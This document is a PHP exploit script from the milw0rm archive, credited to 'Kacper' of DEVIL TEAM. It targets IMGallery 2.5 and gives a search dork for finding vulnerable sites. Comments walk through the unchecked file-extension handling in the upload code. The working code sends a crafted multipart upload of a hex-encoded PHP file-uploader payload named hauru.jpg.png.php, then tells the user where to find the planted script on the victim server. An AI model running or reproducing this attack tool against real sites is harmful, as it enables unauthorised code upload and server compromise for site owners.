<?

//Kacper Settings 
$exploit_name = "IMGallery <= 2.5 Create Uploader Script Exploit";
$script_name = "IMGallery 2.5";
$script_site = "http://www.imgallery.zor.pl/";
$dork = '"Powered by IMGallery"';
//**************************************************************


print '
:::::::::  :::::::::: :::     ::: ::::::::::: :::        
:+:    :+: :+:        :+:     :+:     :+:     :+:        
+:+    +:+ +:+        +:+     +:+     +:+     +:+        
+#+    +:+ +#++:++#   +#+     +:+     +#+     +#+        
+#+    +#+ +#+         +#+   +#+      +#+     +#+        
#+#    #+# #+#          #+#+#+#       #+#     #+#        
#########  ##########     ###     ########### ########## 
::::::::::: ::::::::::     :::     ::::    ::::  
    :+:     :+:          :+: :+:   +:+:+: :+:+:+ 
    +:+     +:+         +:+   +:+  +:+ +:+:+ +:+ 
    +#+     +#++:++#   +#++:++#++: +#+  +:+  +#+ 
    +#+     +#+        +#+     +#+ +#+       +#+ 
    #+#     #+#        #+#     #+# #+#       #+# 
    ###     ########## ###     ### ###       ### 
	
   - - [DEVIL TEAM THE BEST POLISH TEAM] - -
 

[Exploit name: '.$exploit_name.'
[Script name: '.$script_name.'
[Script site: '.$script_site.'
dork: '.$dork.'

Find by: Kacper (a.k.a Rahim)


========>  DEVIL TEAM IRC: irc.milw0rm.com:6667 #devilteam  <========
========>         http://www.rahim.webd.pl/            <========

Contact: kacper1964@yahoo.pl

(c)od3d by Kacper
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Greetings DragonHeart and all DEVIL TEAM Patriots :)
- Leito & Leon | friend str0ke ;)

Blund Coder, D0han, d3m0n, D3m0n (ziom z Niemiec :P), dn0de, DUREK5, fdj, Grzegorz, GrZyB997, konsol, Mandr4ke,
mass, michalind, mIvus, Nua, nukedclx, pepi, QunZ, Qw3rty, RebeL, SkD, Adam, arkadius, asteroid, blue, Ci2u, CrazzyIwan,
DMX, drzewko, ExTrEmE][-][ack, Gelo, Kicaj, Larry, Leito, LEON, Michas, Morpheus, MXZ, Ramzes, redsaq, TomZen

 and
 
Dr Max Virus
TamTurk,
hackersecurity.org

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
                Greetings for 4ll Fusi0n Group members ;-)
                and all members of hacker.com.pl ;)
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
';


/*

Exploit works only when in script user can upload own photos :)

~~~~~~~~~~~~~
in file users_adm/start1.php:
....
$rozm = $_FILES['obraz']['size'];
if($rozm > $wielkosc_pliku) {header("Location: start.php?kategoria_form=$kategoria_form&info=101&karet=$karet&PHPSESSID=$s_id"); exit;}

//ustala typ mime pliku i tworzy odpowiedni prefix dla funkcji GD
$typ_pliku = $_FILES['obraz']['type'];



switch($typ_pliku)             //<------------{1}
        {
                case 'image/jpeg':
                        $pref_gd = "jpeg";
                        break;
                case 'image/png':
                        $pref_gd = "png";
                        break;
               case 'image/pjpeg':
                        $pref_gd = "jpeg";
                        break;
        }



//koniec ustala typ mime pliku i tworzy odpowiedni prefix dla funkcji GD


$nazwa1 = Date("His");//wykorzystanie daty do wygenerowania nowej nazwy dla pliku         //<------------{2}
$nazwa2 = $_FILES['obraz']['name'];//pobranie nazwy pliku z tablicy
$nazwa_zmieniona = "$nazwa1$nazwa2";//po³±czenie daty z nazw± pliku  //<------------{3}

//zamienia polskie litery z jêzyczkami aby nie znalaz³y siê w nazwie fotki
$nazwa_zmieniona = strtolower($nazwa_zmieniona);
$nazwa_zmieniona = ereg_replace(" ","_",$nazwa_zmieniona);
$nazwa_zmieniona = ereg_replace("±","a",$nazwa_zmieniona);
$nazwa_zmieniona = ereg_replace("ê","e",$nazwa_zmieniona);
$nazwa_zmieniona = ereg_replace("¼","z",$nazwa_zmieniona);
$nazwa_zmieniona = ereg_replace("¿","z",$nazwa_zmieniona);
$nazwa_zmieniona = ereg_replace("ó","o",$nazwa_zmieniona);
$nazwa_zmieniona = ereg_replace("³","l",$nazwa_zmieniona);
$nazwa_zmieniona = ereg_replace("¶","s",$nazwa_zmieniona);
$nazwa_zmieniona = ereg_replace("¦","s",$nazwa_zmieniona);
$nazwa_zmieniona = ereg_replace("æ","c",$nazwa_zmieniona);

$file = "../obrazy/".$nazwa_zmieniona.""; //dodaje adres i nazwê zdjêcia do zmiennej, która jet tak¿e wykorzystywana podczas tworzenia miniatury w pliku create_min

move_uploaded_file($_FILES['obraz']['tmp_name'],"../obrazy/".$nazwa_zmieniona);//wgrywa plik na serwer     //<------------{4}

chmod($file, 0755);
....

we can upload file *.php
np. hauru.jpg.png.php  <---- :)

script rename file to:
....
$nazwa1 = Date("His");//wykorzystanie daty do wygenerowania nowej nazwy dla pliku 
$nazwa2 = $_FILES['obraz']['name'];//pobranie nazwy pliku z tablicy
$nazwa_zmieniona = "$nazwa1$nazwa2";//po³±czenie daty z nazw± pliku
....

to check correct name of file:
<?
$nazwa1 = Date("His");//wykorzystanie daty do wygenerowania nowej nazwy dla pliku
$nazwa2 = "hauru.jpg.png.php";
echo "$nazwa1$nazwa2";//po³±czenie daty z nazw± pliku
?>

to find you uploaded file go to:

http://site.com/IMGallery path/obrazy/(youfile)

greetz ;)
*/
if ($argc<4) {
print_r('
-----------------------------------------------------------------------------
Usage: php '.$argv[0].' host path session_id OPTIONS
host:       target server (ip/hostname)
path:       IMGallery path
session id: you user sessionid
Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
Example:
php '.$argv[0].' 127.0.0.1 /IMGallery/ 098ab38d17e71de55c7e9993c26d3998
php '.$argv[0].' 127.0.0.1 /IMGallery/ 098ab38d17e71de55c7e9993c26d3998 -P1.1.1.1:80
-----------------------------------------------------------------------------
');

die;
}

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacket($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}
function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}

$host=$argv[1];
$path=$argv[2];
$sid=$argv[3];


$port=80;
$proxy="";
for ($i=3; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
$hauru=
"\x3c\x3f\x70\x68\x70\x20\x0d\x0a\x69\x66\x28\x69\x73\x73\x65\x74".
"\x28\x24\x5f\x50\x4f\x53\x54\x5b\x27\x75\x70\x6c\x5f\x66\x69\x6c".
"\x65\x73\x27\x5d\x29\x29\x7b\x20\x0d\x0a\x20\x20\x65\x63\x68\x6f".
"\x20\x27\x62\x75\x74\x74\x6f\x6e\x20\x63\x6c\x69\x63\x6b\x65\x64".
"\x27\x3b\x20\x0d\x0a\x20\x20\x2f\x2f\x70\x72\x69\x6e\x74\x5f\x72".
"\x28\x24\x5f\x46\x49\x4c\x45\x53\x5b\x27\x66\x69\x6c\x65\x5f\x6e".
"\x27\x5d\x29\x3b\x20\x0d\x0a\x20\x20\x65\x63\x68\x6f\x20\x27\x3c".
"\x68\x72\x3e\x27\x3b\x20\x0d\x0a\x20\x20\x24\x75\x70\x5f\x6d\x61".
"\x73\x20\x3d\x20\x24\x5f\x46\x49\x4c\x45\x53\x5b\x27\x66\x69\x6c".
"\x65\x5f\x6e\x27\x5d\x3b\x20\x0d\x0a\x20\x20\x24\x6d\x61\x73\x5f".
"\x6e\x61\x6d\x65\x20\x3d\x20\x61\x72\x72\x61\x79\x28\x29\x3b\x20".
"\x0d\x0a\x20\x20\x24\x6d\x61\x73\x5f\x74\x6d\x70\x20\x3d\x20\x61".
"\x72\x72\x61\x79\x28\x29\x3b\x20\x0d\x0a\x20\x20\x66\x6f\x72\x28".
"\x24\x69\x3d\x30\x3b\x20\x24\x69\x3c\x31\x30\x3b\x20\x24\x69\x2b".
"\x2b\x29\x7b\x20\x0d\x0a\x20\x20\x20\x20\x69\x66\x28\x21\x65\x6d".
"\x70\x74\x79\x28\x24\x75\x70\x5f\x6d\x61\x73\x5b\x27\x6e\x61\x6d".
"\x65\x27\x5d\x5b\x24\x69\x5d\x29\x29\x7b\x20\x0d\x0a\x20\x20\x20".
"\x20\x20\x20\x24\x6a\x20\x3d\x20\x63\x6f\x75\x6e\x74\x28\x24\x6d".
"\x61\x73\x5f\x6e\x61\x6d\x65\x29\x3b\x20\x0d\x0a\x20\x20\x20\x20".
"\x20\x20\x24\x6d\x61\x73\x5f\x6e\x61\x6d\x65\x5b\x24\x6a\x5d\x20".
"\x3d\x20\x24\x75\x70\x5f\x6d\x61\x73\x5b\x27\x6e\x61\x6d\x65\x27".
"\x5d\x5b\x24\x69\x5d\x3b\x20\x0d\x0a\x20\x20\x20\x20\x20\x20\x24".
"\x6d\x61\x73\x5f\x74\x6d\x70\x5b\x24\x6a\x5d\x20\x3d\x20\x24\x75".
"\x70\x5f\x6d\x61\x73\x5b\x27\x74\x6d\x70\x5f\x6e\x61\x6d\x65\x27".
"\x5d\x5b\x24\x69\x5d\x3b\x20\x0d\x0a\x20\x20\x20\x20\x20\x20\x7d".
"\x20\x0d\x0a\x20\x20\x20\x20\x7d\x20\x0d\x0a\x20\x20\x66\x6f\x72".
"\x28\x24\x69\x3d\x30\x3b\x20\x24\x69\x3c\x63\x6f\x75\x6e\x74\x28".
"\x24\x6d\x61\x73\x5f\x6e\x61\x6d\x65\x29\x3b\x20\x24\x69\x2b\x2b".
"\x29\x7b\x20\x0d\x0a\x20\x20\x20\x20\x24\x75\x70\x6c\x5f\x66\x69".
"\x6c\x65\x20\x3d\x20\x27\x2e\x2f\x27\x2e\x24\x6d\x61\x73\x5f\x6e".
"\x61\x6d\x65\x5b\x24\x69\x5d\x3b\x20\x0d\x0a\x20\x20\x20\x20\x69".
"\x66\x28\x6d\x6f\x76\x65\x5f\x75\x70\x6c\x6f\x61\x64\x65\x64\x5f".
"\x66\x69\x6c\x65\x28\x24\x6d\x61\x73\x5f\x74\x6d\x70\x5b\x24\x69".
"\x5d\x2c\x20\x24\x75\x70\x6c\x5f\x66\x69\x6c\x65\x29\x29\x7b\x20".
"\x0d\x0a\x20\x20\x20\x20\x20\x20\x65\x63\x68\x6f\x20\x27\x3c\x61".
"\x20\x68\x72\x65\x66\x3d\x22\x27\x2e\x24\x6d\x61\x73\x5f\x6e\x61".
"\x6d\x65\x5b\x24\x69\x5d\x2e\x27\x22\x3e\x27\x2e\x24\x6d\x61\x73".
"\x5f\x6e\x61\x6d\x65\x5b\x24\x69\x5d\x2e\x27\x3c\x2f\x61\x3e\x3c".
"\x62\x72\x3e\x27\x3b\x20\x0d\x0a\x20\x20\x20\x20\x20\x20\x7d\x20".
"\x0d\x0a\x20\x20\x20\x20\x7d\x20\x0d\x0a\x20\x20\x7d\x20\x0d\x0a".
"\x3f\x3e\x20\x0d\x0a\x0d\x0a\x3c\x66\x6f\x72\x6d\x20\x65\x6e\x63".
"\x74\x79\x70\x65\x3d\x22\x6d\x75\x6c\x74\x69\x70\x61\x72\x74\x2f".
"\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61\x22\x20\x6d\x65\x74\x68\x6f".
"\x64\x3d\x22\x70\x6f\x73\x74\x22\x20\x61\x63\x74\x69\x6f\x6e\x3d".
"\x22\x22\x3e\x20\x0d\x0a\x3c\x64\x69\x76\x20\x73\x74\x79\x6c\x65".
"\x3d\x22\x70\x61\x64\x64\x69\x6e\x67\x3a\x20\x31\x30\x70\x78\x3b".
"\x20\x62\x6f\x72\x64\x65\x72\x3a\x20\x31\x70\x78\x20\x73\x6f\x6c".
"\x69\x64\x20\x23\x63\x63\x63\x63\x63\x63\x3b\x20\x77\x69\x64\x74".
"\x68\x3a\x20\x33\x30\x30\x70\x78\x3b\x22\x3e\x20\x0d\x0a\x3c\x3f".
"\x70\x68\x70\x20\x0d\x0a\x20\x20\x66\x6f\x72\x28\x24\x69\x3d\x30".
"\x3b\x20\x24\x69\x3c\x31\x30\x3b\x20\x24\x69\x2b\x2b\x29\x7b\x20".
"\x0d\x0a\x20\x20\x20\x20\x65\x63\x68\x6f\x20\x27\x3c\x70\x3e\x3c".
"\x69\x6e\x70\x75\x74\x20\x74\x79\x70\x65\x3d\x22\x66\x69\x6c\x65".
"\x22\x20\x6e\x61\x6d\x65\x3d\x22\x66\x69\x6c\x65\x5f\x6e\x5b\x5d".
"\x22\x3e\x3c\x2f\x70\x3e\x27\x3b\x20\x0d\x0a\x20\x20\x20\x20\x7d".
"\x20\x0d\x0a\x3f\x3e\x20\x0d\x0a\x3c\x2f\x64\x69\x76\x3e\x20\x0d".
"\x0a\x3c\x64\x69\x76\x20\x73\x74\x79\x6c\x65\x3d\x22\x70\x61\x64".
"\x64\x69\x6e\x67\x3a\x20\x31\x30\x70\x78\x3b\x20\x62\x6f\x72\x64".
"\x65\x72\x3a\x20\x31\x70\x78\x20\x73\x6f\x6c\x69\x64\x20\x23\x63".
"\x63\x63\x63\x63\x63\x3b\x20\x6d\x61\x72\x67\x69\x6e\x2d\x74\x6f".
"\x70\x3a\x20\x31\x30\x70\x78\x3b\x20\x77\x69\x64\x74\x68\x3a\x20".
"\x33\x30\x30\x70\x78\x3b\x22\x3e\x20\x0d\x0a\x20\x20\x3c\x69\x6e".
"\x70\x75\x74\x20\x74\x79\x70\x65\x3d\x22\x73\x75\x62\x6d\x69\x74".
"\x22\x20\x6e\x61\x6d\x65\x3d\x22\x75\x70\x6c\x5f\x66\x69\x6c\x65".
"\x73\x22\x20\x76\x61\x6c\x75\x65\x3d\x22\x75\x70\x6c\x6f\x61\x64".
"\x22\x3e\x20\x0d\x0a\x3c\x2f\x64\x69\x76\x3e\x20\x0d\x0a\x3c\x2f".
"\x66\x6f\x72\x6d\x3e\x20";
$data.='---------------------------7d61bcd1f033e
Content-Disposition: form-data; name="urljump"

start.php?kategoria_form=2&PHPSESSID='.$sid.'
---------------------------7d61bcd1f033e
Content-Disposition: form-data; name="obraz"; filename="hauru.jpg.png.php"
Content-Type: text/plain

'.$hauru.'
---------------------------7d61bcd1f033e
Content-Disposition: form-data; name="opis"

DEVIL TEAM ;-)
---------------------------7d61bcd1f033e
Content-Disposition: form-data; name="submit"

Dodaj
---------------------------7d61bcd1f033e--';
echo "You date code1:\n";
echo Date("His");
echo "\n";
$tim1 = Date("His");
echo "upload Hauru!! (step 1)...\n";
$packet ="POST ".$p."users_adm/start.php?kategoria_form=2&PHPSESSID=".$sid." HTTP/1.0\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
$packet.="Cookie: PHPSESSID=".$sid.";\r\n";
$packet.="Cookie: odwiedziny=zaliczone;\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d61bcd1f033e\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacket($packet);
echo "You date code2:\n";
echo Date("His");
$tim2 = Date("His");
sleep(1);
echo "\n";
echo "check you localisation of upload script: $tim1\n";
echo 'Find you upload script: http://'.$host.$path.'obrazy/'.$tim2.'hauru.jpg.png.php';
echo "\n";
echo "or search between $tim1 and $tim2\n";
echo "\n";
echo "Go to DEVIL TEAM IRC: irc.milw0rm.com:6667 #devilteam\r\n";
?>

# milw0rm.com [2006-12-30]